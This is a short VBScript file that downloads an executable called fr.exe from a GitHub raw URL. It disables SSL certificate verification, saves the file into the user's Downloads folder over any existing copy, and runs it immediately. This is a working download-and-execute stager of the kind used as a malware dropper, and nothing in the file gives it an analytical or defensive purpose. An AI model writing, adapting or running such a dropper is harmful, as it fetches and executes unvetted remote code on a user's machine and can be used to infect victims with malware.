Option Explicit

Dim objHTTP, objADOStream, strFileURL, strHDLocation
Dim objShell, userDownloadsFolder, fileSavePath

' URL of the file to download
strFileURL = "https://github.com/network2city/boot/raw/main/fr.exe"

' Local path to save the downloaded file
userDownloadsFolder = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%USERPROFILE%\Downloads")
fileSavePath = userDownloadsFolder & "\fr.exe"

' Create the ServerXMLHTTP and ADOStream objects
Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
Set objADOStream = CreateObject("ADODB.Stream")

' Disable SSL certificate verification (if necessary)
objHTTP.SetOption 2, objHTTP.GetOption(2) - 13056

' Open a connection to the remote file
objHTTP.Open "GET", strFileURL, False
objHTTP.Send

' Check for HTTP status success
If objHTTP.Status = 200 Then
    ' Set the stream type and open a connection to the local file
    objADOStream.Type = 1
    objADOStream.Open

    ' Load the downloaded content into the stream
    objADOStream.Write objHTTP.ResponseBody
    objADOStream.Position = 0

    ' Save the stream content to the local file
    On Error Resume Next
    objADOStream.SaveToFile fileSavePath, 2 ' 1 = no overwrite, 2 = overwrite
    If Err.Number <> 0 Then
        WScript.Echo "Failed to save file: " & Err.Description
    Else
        
    End If
    On Error GoTo 0

    ' Clean up the objects
    objADOStream.Close
    Set objADOStream = Nothing
    Set objHTTP = Nothing
Else
    WScript.Echo "Failed to download file. HTTP status: " & objHTTP.Status
End If

' Run the downloaded file using Windows Script Host
Set objShell = CreateObject("WScript.Shell")
objShell.Run fileSavePath, 1, True
